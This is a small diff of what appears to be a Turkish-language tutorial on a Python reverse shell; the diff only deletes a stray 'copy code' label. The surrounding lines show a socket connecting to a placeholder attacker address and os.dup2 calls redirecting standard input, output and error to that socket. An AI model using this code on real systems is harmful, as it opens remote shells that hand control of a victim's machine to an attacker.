@@ -23,7 +23,7 @@ s.connect(("SALDIRI_HEDEF_IP", SALDIRI_HEDEF_PORT))
 s.connect(): Saldırganın IP adresi (SALDIRI_HEDEF_IP) ve port numarası (SALDIRI_HEDEF_PORT) belirtilerek saldırganın kontrolündeki makineye bağlanılır.
 2.4. Dosya Tanıtıcılarının Yönlendirilmesi
 
-Kodu kopyala
+
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
